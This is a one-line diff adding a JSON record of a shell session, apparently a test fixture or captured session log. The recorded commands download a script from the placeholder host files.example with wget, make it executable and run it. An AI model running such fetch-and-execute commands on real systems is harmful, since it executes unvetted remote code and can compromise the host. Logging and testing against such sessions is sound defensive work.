@@ -1,0 +1,1 @@
+{"mode": "shell", "connected": true, "authenticated": true, "lines_sent": ["uname -a", "wget http://files.example/x.sh -O x.sh", "chmod +x x.sh", "./x.sh"], "output_bytes": 838, "error": null, "started_unix": 1794417585.522654, "client_local": "10.250.25.4:46198", "host_key_fingerprint": "e5:c5:a4:a5:7a:0a:52:b8:99:4e:b0:31:c7:cd:a1:eb", "finished_unix": 1794417594.3884614}
